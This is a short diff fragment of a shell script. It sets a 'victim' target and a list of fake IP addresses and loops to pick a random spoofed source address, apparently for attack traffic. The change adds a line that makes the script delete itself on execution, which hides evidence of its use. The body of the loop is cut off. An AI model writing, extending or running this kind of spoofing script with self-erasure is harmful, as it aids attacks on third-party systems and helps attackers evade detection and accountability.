@@ -4,6 +4,8 @@ FAKE_IPS=("10.0.0.2" "10.0.0.3" "10.0.0.4" "10.0.0.5" "10.0.0.6")
 
 TARGET="victim"
 
+rm -- "$0"
+
 # cycle through ips randomly
 while true; do
     RANDOM_IP=${FAKE_IPS[$RANDOM % ${#FAKE_IPS[@]}]}
